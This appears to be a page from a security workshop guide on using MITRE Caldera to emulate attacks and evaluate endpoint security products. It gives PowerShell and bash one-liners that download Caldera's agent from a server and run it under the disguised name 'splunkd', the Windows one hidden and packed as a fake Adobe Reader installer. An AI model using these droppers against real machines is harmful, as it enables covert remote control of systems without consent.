---
title: "Mitre Caldera"
chapter: false
weight: 31
pre: "<b>3.1 </b>"
---
## Mitre Caldera
CALDERA™ is a cybersecurity framework developed by MITRE that empowers cyber practitioners to save time, money, and energy through automated security assessments.

We are using Caldera as one of the tools to help us evaluate how Cloud One Workload Security and Vision One could empower companies to improve their security posture and risk management.


### Mitre Caldera - Pre-Configuration
Before you start with the attack simulation, be sure you updated the Mitre Caldera Global Configurations.
You must replace the IP Address (0.0.0.0) with the Public IP Address you are using to access the Mitre Caldera management console.

{{< youtube id="V4AxIqFGqrU" >}}

---

### Dropping the Malicious Payloads
After you update the IP Configuration, you are ready to create the payloads we are going to use with this demo.

#### Windows Payload
The first payload we will create is the Windows Payload. You will pack the malicious payload into an executable file, uploading it to filebin.net and then downloading and executing it on the Windows Client.

The following video shows step-by-step how to create this malicious payload and drop it to the Windows Target.

        Windows Payload
        
        $server="http://caldera-public-ip-address";
        $url="$server/file/download";
        $wc=New-Object System.Net.WebClient;
        $wc.Headers.add("platform","windows");
        $wc.Headers.add("file","sandcat.go");
        $data=$wc.DownloadData($url);
        get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
        rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
        [io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
        Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
        Install-Script -Name Download-AdobeReaderDC

References:
- AdobeReaderInstaller.ps1 https://www.powershellgallery.com/packages/Download-AdobeReaderDC/1.0.0
- PS1toEXE - https://ps2exe.azurewebsites.net/
- Online Storage - https://filebin.net/

{{< youtube id="Y7BuLK5055M" >}}

---
#### Linux Payload
The first payload we will create is the Windows Payload. You will create one script based on this payload, then uploading it to filebin.net and then downloading and executing it on the Windows Client.

The following video shows step-by-step how to create this malicious payload and drop it to the Linux Target.

        Linux Payload

        server="http://caldera-public-ip-address";
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
        chmod +x splunkd;
        ./splunkd -server $server -group red -v

References:
- Online Storage - https://filebin.net/

{{< youtube id="SXQybQwwjX4" >}}


---


